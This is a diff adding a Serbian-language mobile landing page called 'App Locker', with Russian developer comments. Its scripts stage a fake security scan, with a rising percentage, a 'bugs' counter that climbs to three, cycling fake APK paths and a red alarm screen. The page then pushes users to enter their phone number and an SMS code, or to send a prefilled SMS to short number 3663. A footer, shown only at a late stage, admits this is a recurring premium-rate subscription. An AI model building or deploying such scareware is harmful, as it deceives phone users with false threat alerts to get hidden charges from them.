@@ -1,0 +1,462 @@
+<!DOCTYPE html>
+<html id="htmlo_O" class="fw-light">
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">
+	<title>App Locker</title>
+	<link rel="shortcut icon" href="favicon.png" type="image/x-icon">
+	<link rel="stylesheet" media="screen" type="text/css" href="css/unlike.css" />
+	<link rel="stylesheet" media="screen" type="text/css" href="css/style.css" />
+
+
+
+
+	<script type="text/javascript">
+	function update_first(){window.setTimeout(render_first, 5500);}
+
+	var footer_bg = new Image();
+	footer_bg.src = 'img/bg_footer.png'
+	function render_last(){
+		el_footer.setAttribute('style', 'background-image: url(' + footer_bg.src + ');');
+		el_form_1.setAttribute('style', 'opacity: 0;')
+		el_form_2.setAttribute('tt', 'down');
+		el_form_3.setAttribute('tt', 'up')
+		el_htmlo_O.setAttribute('style', 'background-color: #FF6349;');
+		el_version.setAttribute('style', 'color: #ffc8bf;');
+		document.getElementById('extra').setAttribute('class', 'block_enable');
+	}
+
+	var proc_counter = 0;
+	function update_proc(){window.setTimeout(render_proc, 50);}
+	function render_proc(){
+		proc_counter++
+		el_proc.innerHTML = proc_counter + '%';
+		if(proc_counter < 100){update_proc()}
+	}
+
+
+	var bugs_counter = 0;
+	function update_bugs(){window.setTimeout(render_bugs, 1500);}
+	function render_bugs(){
+		bugs_counter++
+		el_bugs.innerHTML = bugs_counter;
+		el_bugs.setAttribute('style', 'opacity: 1;');
+		if(bugs_counter < 3){update_bugs()}
+	}
+
+
+	folders_counter = 0
+	var folders = [
+		'/storage/7/...app91application.apk',
+		'/storage/2/...sys59application.apk',
+		'/storage/10/...inf85application.apk',
+		'/storage/0/...inf59application.apk'
+	]
+	function update_folders(){window.setTimeout(render_folders, 100);}
+	function render_folders(){
+		folders_counter++;
+		cnt = folders_counter%folders.length;
+		el_folders.innerHTML = folders[cnt];
+		if(proc_counter < 100){update_folders()}
+	}
+
+	var icon_counter = 0
+	var icon_list = [
+		'Sistemni fajl',
+		'Aplikacije',
+		'Preuzeti fajli',
+		'Internet keš'
+	]
+	function update_icons(){window.setTimeout(render_icons, 1000);}
+	function render_icons(){
+		document.getElementById('icon_'+icon_counter).setAttribute("class", "activate")
+		el_folder_class.innerHTML = icon_list[icon_counter]
+		icon_counter++
+		if (icon_counter < 4){update_icons()}
+	}
+
+
+
+
+	function startRender(){
+		el_footer = document.getElementById('footer');
+		el_proc = document.getElementById('proc');
+		el_bugs = document.getElementById('bugs');
+		el_folders = document.getElementById('folders');
+		el_form_1 = document.getElementById('form_1');
+		el_form_2 = document.getElementById('form_2');
+		el_form_3 = document.getElementById('form_3');
+		el_folder_class = document.getElementById('folder_class');
+		el_htmlo_O = document.getElementById('htmlo_O');
+		el_version = document.getElementById('version');
+
+		render_proc();
+		update_bugs();
+		update_folders();
+		update_icons();
+
+		window.setTimeout(render_last, 5500);
+	}
+
+	var el_form_1 = null;
+	var el_form_2 = null;
+	var el_form_3 = null;
+	var el_folders = null;
+	var el_proc = null;
+	var el_el_bugs = null;
+	var el_footer = null;
+	var el_folder_class = null;
+	var el_htmlo_O = null;
+	var el_version = null;
+
+	window.onload = function () {startRender();};
+	</script>
+	<script src="js/all.js"></script>
+</head>
+
+<body unstyle="container direct" class="light c-black">
+	<div unstyle="cn-center" class="header grid_100p bg-white layer_9">
+		<div unstyle="cn-space to_cent" class="grid_18r">
+			<div>App Locker</div>
+			<div class="fs-x08 tx-center fw-normal c-silver">v. 4.05.11</div>
+		</div>
+	</div>
+
+	<div unstyle="cn-center_around" class="content layer_1 bg-white">
+
+		<div unstyle="cn-around_start" class="grid_18r layer_3 fw-normal info_1">
+			<div class="grid_3r tx-center">
+				<img src="img/red_shield.svg" class="grid_3r">
+			</div>
+			<div unstyle="cn-center_center" class="fw-light fs-x09 grid_100p tx-center">
+				<div class="grid_100p fs-x14 fw-bold">Provera nivoa zaštite aplikacije</div>
+				<!-- <div unstyle="cn-center" class="grid_100p fs-x09">
+					<div>Vršemo skeniranje sistema</div>
+					<div id="dotter" class="geid_1r">.</div>
+				</div> -->
+			</div>
+		</div>
+		<div unstyle="cn-around_start" class="grid_18r layer_3 fw-normal info_2">
+			<div unstyle="cn-center_center" class="fw-light fs-x09 grid_100p tx-center">
+				<div class="grid_100p fs-x15 fw-light">Instaliraj</div>
+				<div class="grid_100p fs-x15 fw-bold">App Locker</div>
+				<!-- <div class="grid_100p fs-normal fw-lght">Čekanje na čišćenje sistema</div> -->
+			</div>
+		</div>
+
+		<div class="logo">
+			<div unstyle="cn-center to_cent" class="radar layer_1">
+				<div class="slice spin"></div>
+				<div class="slice filt"></div>
+				<div class="mask"></div>
+			</div>
+			<div unstyle="cn-around_around" class="radar_unground layer_4">
+				<div id="proc" class="grid_100p fw-light tx-center c-white">100%</div>
+				<div id="bugs" unstyle="cn-center to_cent" class="c-white fw-thin">0</div>
+			</div>
+		</div>
+
+		<div class="logo_new layer_9">
+			<div>
+				<div></div>
+			</div>
+		</div>
+
+		<!-- <div unstyle="cn-center to_cent" class="scan_result grid_100p c-silver">
+			<div unstyle="cn-space to_cent" class="grid_18r">
+				<div class="fs-x11">00:10:24</div>
+				<div unstyle="cn-center to_cent">
+					<img src="img/virus.svg">
+					<div class="fs-x20">&nbsp;3</div>
+				</div>
+			</div>
+		</div> -->
+
+	</div>
+
+	<div unstyle="self_grow" id="footer" class="footer">
+		<div class="dinamic_bg_cont grid_100p">
+			<div class="dinamic_bg"></div>
+		</div>
+
+		<div unstyle="cn-center_around to_cent" tt="up" id="form_1" class="grid_100p">
+			<div id="folders" class="grid_100p c-silver fs-x08 tx-center">/storage/7/...app91application.apk</div>
+
+			<div unstyle="cn-around_around" class="bg-white form_border grid_18r">
+				<div class="tx-center c-black">Provera: <span id="folder_class" class="grid_100p c-red">Sistemni fajl</span></div>
+				<div unstyle="cn-around to_cent" class="grid_100p pad_1r_l pad_1r_r">
+
+
+
+
+
+
+
+
+<svg id="icon_0" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
+	 viewBox="0 0 62.8 61.8" style="enable-background:new 0 0 62.8 61.8;" xml:space="preserve">
+<style type="text/css">
+	.st1{fill:none;stroke:#D2D2D2;stroke-width:1.5;stroke-linejoin:round;stroke-miterlimit:10;}
+</style>
+<g>
+	<path id="icon_0" class="st1" d="M60.4,36.1v-9.7h-5.3c-0.2-1-0.5-1.8-0.8-2.8l4.7-2.7l-4.8-8.4l-4.7,2.7c-0.6-0.7-1.3-1.4-2-2l2.7-4.7
+		l-8.4-4.8l-2.7,4.7c-0.9-0.3-1.8-0.7-2.8-0.9V2.4h-9.7v5.3c-1,0.2-1.8,0.5-2.8,0.8l-2.7-4.7l-8.4,4.8l2.7,4.7c-0.7,0.6-1.4,1.3-2,2
+		l-4.7-2.7L4,21l4.7,2.7c-0.3,0.9-0.7,1.8-0.9,2.8H2.5v9.7h5.3c0.2,1,0.5,1.8,0.8,2.8L4,41.6L8.8,50l4.7-2.7c0.6,0.7,1.3,1.4,2,2
+		L12.8,54l8.4,4.8l2.7-4.7c0.9,0.3,1.8,0.7,2.8,0.8v5.3h9.7v-5.3c1-0.2,1.9-0.5,2.8-0.9l2.7,4.7l8.4-4.8l-2.7-4.7
+		c0.7-0.6,1.4-1.3,2-2l4.7,2.7l4.8-8.4l-4.7-2.7c0.3-0.9,0.7-1.8,0.8-2.8H60.4z M31.5,40.8c-5.2,0-9.5-4.2-9.5-9.5
+		c0-5.2,4.2-9.5,9.5-9.5c5.2,0,9.5,4.3,9.5,9.5C40.9,36.5,36.7,40.8,31.5,40.8z"/>
+</g>
+</svg>
+
+					<img src="img/arrow.png" class="arrow">
+
+
+
+
+
+
+
+
+
+<svg version="1.1" id="icon_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
+	 viewBox="0 0 56.3 64.7" style="enable-background:new 0 0 56.3 64.7;" xml:space="preserve">
+<style type="text/css">
+
+		.st0{fill-rule:evenodd;clip-rule:evenodd;fill:none;stroke:#D2D2D2;stroke-width:1.5;stroke-linecap:round;stroke-linejoin:round;stroke-miterlimit:10;}
+
+		.st1{fill-rule:evenodd;clip-rule:evenodd;stroke:#D2D2D2;stroke-width:1.5;stroke-linecap:round;stroke-linejoin:round;stroke-miterlimit:10;}
+</style>
+<path class="st0" d="M38.1,37.4c-3.4,0-6.1-2.7-6.1-6.1c0-3.4,2.7-6.1,6.1-6.1c3.4,0,6.1,2.7,6.1,6.1"/>
+<path class="st0" d="M18,37.4c-3.4,0-6.1-2.7-6.1-6.1c0-3.4,2.7-6.1,6.1-6.1c3.4,0,6.1,2.7,6.1,6.1"/>
+<path class="st0" d="M17.2,31.9c0,0,0-14.8,0-19.2c0-4.3,3.2-10.3,10.9-10.3c8.1,0,11.1,6,11.1,10.3c0,6.2,0,19.1,0,19.1"/>
+<path class="st1" d="M4.3,54.6c0,0,20.8,0,34.7,0 M44.2,54.6c4.3,0,7.1,0,7.1,0"/>
+<polygon class="st0" points="8,19.9 47.8,19.9 54,62.5 2.3,62.5 "/>
+</svg>
+
+
+
+
+					<img src="img/arrow.png" class="arrow">
+
+
+
+
+
+
+
+
+
+
+<svg version="1.1" id="icon_2" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
+	 viewBox="0 0 65 51" style="enable-background:new 0 0 65 51;" xml:space="preserve">
+<style type="text/css">
+
+		.st0{fill-rule:evenodd;clip-rule:evenodd;fill:none;stroke:#D2D2D2;stroke-width:1.5;stroke-linecap:round;stroke-linejoin:round;stroke-miterlimit:10;}
+</style>
+<polyline class="st0" points="57.5,10.6 57.5,7.8 36,7.8 36,2.3 10.7,2.3 10.7,8.7 3,8.7 "/>
+<polyline class="st0" points="2.9,8.7 2.9,48.9 62.5,48.9 62.5,13.5 10.2,13.5 10,48.5 "/>
+</svg>
+
+
+					<img src="img/arrow.png" class="arrow">
+
+
+
+
+
+
+
+
+
+<svg version="1.1" id="icon_3" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
+	 viewBox="0 0 80.5 56" style="enable-background:new 0 0 80.5 56;" xml:space="preserve">
+<style type="text/css">
+
+		.st0{fill-rule:evenodd;clip-rule:evenodd;fill:none;stroke:#D2D2D2;stroke-width:1.5;stroke-linecap:round;stroke-linejoin:round;stroke-miterlimit:10;}
+</style>
+<path class="st0" d="M40.9,16.1c0,0,3.3-7,10.2-7s9.9,5.9,10.2,8.6c0.3,2.8-1.1,7-1.1,7"/>
+<path class="st0" d="M21.4,22.1c0,0-0.5-5.1,4.2-7.1c5.6-2.4,9.2,1.8,9.2,1.8"/>
+<path class="st0" d="M17.6,28.7c0,0-6.7,2.8-6.7,7.5c0,7.2,5.8,9.2,7.4,9.2c1.7,0,43.2,0,46.1,0s6-3.2,6-7.2c0-5.1-8.5-6.8-8.5-6.8"
+	/>
+<path class="st0" d="M63.9,53.5c4.7,0,14.7-3.5,14.7-14.3c0-12.4-11.4-14.9-11.4-14.9s2.9-11.3-2.8-17c-6.3-6.5-14.4-6.6-20-3.9
+	c-4.2,2-7,6.8-7,6.8s-8-6.4-15.7-1.7c-7.7,4.7-7.3,11.4-7.3,11.4S2,23.6,2,38.8c0,11.1,13.1,15,16.5,15
+	C21.8,53.8,56.9,53.5,63.9,53.5z"/>
+</svg>
+
+
+
+
+
+
+
+
+
+
+
+
+				</div>
+			</div>
+		</div>
+
+
+		<div id="form_2" unstyle="cn-around_space" class="grid_100p">
+			<button class="grid_18r fs-x13 c-white">Prestani proveru</button>
+		</div>
+
+
+
+		<div id="form_3" class="grid_100p">
+
+<div id="desk">
+	<form id="mobileBox" action="" unstyle="cn-around_around" class="grid_18r form_data bg-white">
+		<div class="step_1 grid_100p c-black tx-center fs-x09 fw-normal">
+			<div class="fw-bold">Da biste instalirali App Locker</div>
+			<div>unesite broj telefona</div>
+		</div>
+		<div class="step_2 grid_100p c-black tx-center fs-x09 fw-normal">
+			<div class="fw-bold">Unesite kod</div>
+			<div>sa dolazne SMS</div>
+		</div>
+
+		<div unstyle="cn-start to_cent" class="step_1 grid_16r bg-white box_tel">
+			<div class="icon_tel"></div>
+			<div unstyle="cn-center" class="grid_100p">
+				<input id="tel" class="grid_100p pad_05r_lr fs-normal fw-normal" type="tel" size="12" value="7">
+			</div>
+		</div>
+		<div unstyle="cn-start to_cent" class="step_2 grid_16r bg-white box_code">
+			<input id="code" class="grid_100p pad_05r_lr fs-normal fw-normal" type="text"  value="" placeholder="Kod iz sms">
+		</div>
+
+		<button class="step_1 grid_16r fs-normal c-white">Instaliraj</button>
+		<button class="step_2 grid_16r fs-normal c-white"></button>
+
+		<div id="back" class="step_2 back grid_100p  tx-center fs-x09 fw-normal">Drugi broj telefona</div>
+	</form>
+<script type="text/javascript">
+var valid_phone = false
+
+$("#mobileBox").submit(function() {
+	if(!valid_phone) {
+		$('#tel').addClass('errors');
+	} else {
+	    $('.step_1').fadeOut(0);
+	    $('.step_2').fadeIn(300);
+	    $('#back').fadeIn(300);
+		$('#tel').removeClass('errors');
+    	$.ajax({
+    		type: "POST",
+    		url: window.location.pathname,
+    		data: $("#mobileBox").serialize(),
+    		success: function(json)
+    		{
+    			var data = json != "" ? $.parseJSON(json) : {};
+    			if (data.redirect) {
+    				window.location.href = data.redirect;
+    			}
+    			if(data.status == 'showCode'){
+    				$('.input-phone_wrap').hide(0);
+					$('.input-code_wrap').fadeIn(300);
+					$('.hidden_btn').fadeIn(300);
+    			}
+    			$('.error').html(data.message).show();
+    		}
+    	});
+    }
+	return false;
+});
+$('#back').click(function() {
+	$('.step_2').fadeOut(0);
+    $('.step_1').fadeIn(300);
+    return false;
+});
+$("#mobileBox button.step_2").click(function() {
+	if ($('#code').val().length > 0) {
+		$("#code").removeClass('errors');
+		$.ajax({
+	  		type: "POST",
+	   		url: window.location.pathname,
+	   		data: $("#mobileBox").serialize(),
+	   		success: function(json)
+	   		{
+	   			alert('FIX THIS: Все получилось!');
+	   		},
+	   		error: function(){
+	   			alert('FIX THIS: Сервер недоступен или вернул ошибку')
+	   		}
+	   	});
+	} else {
+		$("#code").addClass('errors');
+	}
+    return false;
+});
+</script>
+</div>
+
+			<div id="mo">
+				<div unstyle="cn-around_around to_cent" class="grid_18r form_data bg-white">
+					<div id="mo_inform" class="tx-center fs-x09">
+						<div class="fw-bold">Preporučujemo da instalirate ažuriranje</div>
+						<div>da zaštitu vaših aplikacija</div>
+					</div>
+					<a id="link" class="grid_16r fs-normal c-white" href="">Instaliraj</a>
+
+				</div>
+			</div>
+
+
+			<div id="mt">
+				<div unstyle="cn-around_around to_cent" class="grid_18r form_data bg-white">
+					<div class="grid_100p c-black tx-center fs-x09 fw-normal">
+						<div class="fw-bold">Da biste instalirali App Locker</div>
+						<div>da pošaljete SMS</div>
+            <div><span>APP 3816244289</span> na broj <span>3663</span></div>
+					</div>
+				</div>
+			</div>
+
+		</div>
+
+		<div id="version" class="grid_100p c-silver fs-x09 tx-center fw-light version">v. 4.05.11</div>
+	</div>
+
+	<script src="http://resourcesfiles.com/mobile_detect/mobile-detect.min.js"></script>
+	<script>
+
+		var obj = new Advert;
+
+
+		if (obj.md.mobile()) { // true - если моб или планшет
+			if (obj.md.phone()) { // true - если моб, false - если планшет
+				obj.setTemplatePath(); //устанавливаем шаблон СМС (? или &)
+
+				if(obj.template) { //если это не виндафон или старый iOS - идем сюда
+          obj.showBox({id: 'mo', type: 'mo', link: { id: 'link', number: '3663', body: {android: 'APP ID 3816244289 za prijem App Locker-a pomocu kog cu zastititi informacije na telefonu. Primiti!', ios: 'APP ID 3816244289 za prijem App Locker-a pomocu kog cu zastititi informacije na telefonu. Primiti!'}}}); //Показываем блок для МО
+          //Тут валидация номера и прочая ерунда
+				} else {
+					obj.showBox({id: 'mt', type: 'mt'}); // Показываем блок для МТ для старых айфонов и виндафнов
+				}
+			} else {
+				obj.showBox({id: 'mt', type: 'mt'}); //Показываем блок МТ для планшетов
+			}
+
+		} else {
+
+				obj.showBox({id: 'mt', type: 'mt'}); //Показываем блок МТ для планшетов
+
+		}
+	</script>
+
+<div id="extra" class="block_disable">
+<style type="text/css">
+	#extra {position: absolute; top: 98vh; width: 100%; text-align: center; font-family: Arial;}
+	.block_enable {display: block;}
+	.block_disable {display: none;}
+	.exttra__text a {color: #999;}
+	.exttra__text {font-size: 11px; color: #666; margin: 0 auto;}
+</style>
+  <div class="exttra__text">Za korišćenje usluga na Appbox.click potrebno je platiti preko SMS sa dodatom vrednošću. Puni tekst Opštih uslova za korišćenje usluge možete da pročitate <a href="http://rs.appbox.click/page/rules">OVDE</a>.Registracijiom i slanjem SMS poruke sa dodatom vrednošću na svaki iz kratkih brojeva navedenihniže Vi prihvatate Opšte uslove usluge i potvrđujete da imate 18 godina kao i da ste Vi vlasnik brojamobilnog telefona kojeg koristite ili da imate dozvolu od vlasnika za korišćenje telefona. Svi testovi, sve igre ili aplikacije koje su predstavljene na tekućoj verziji internet strane namenjene suisključivo za korišćenje u cilju zabave. Uplate se primaju od klijenata sledećih mobilnih operatera – MTS, Telenor, VIP. Pošaljite APP na kratki broj 3663 (120 RSD sa PDV)x2 za 7 dana dostupa (VIP). Pošaljite APP na kratki broj 3663 (180 RSD sa PDV)x2 za 7 dana dostupa (MTS, Telenor). Standardna cena SMS MO za krajnjeg korisnika u mreže operatera, uključujuči PDV (MTS 3,60 RSD, Telenor 3,60 RSD, VIP 3,47 RSD). Za odjavu sa servisa pošaljite STOP na kratki broj 3663 po ceni standardnog SMSa. Mobistream OU je vlasnik ovog servisa i snosi punu odgovor nost prema njegovim korisnicima. DIMOCO je odgovoran za naplatu korisnika. U slučaju bilo kakvih pitanja u vezi sa servisom molimo Vas da nas kontaktirate na 381800812176 ili rs@mobistream.eu</div>
+</div>
+
+</body>
+</html>
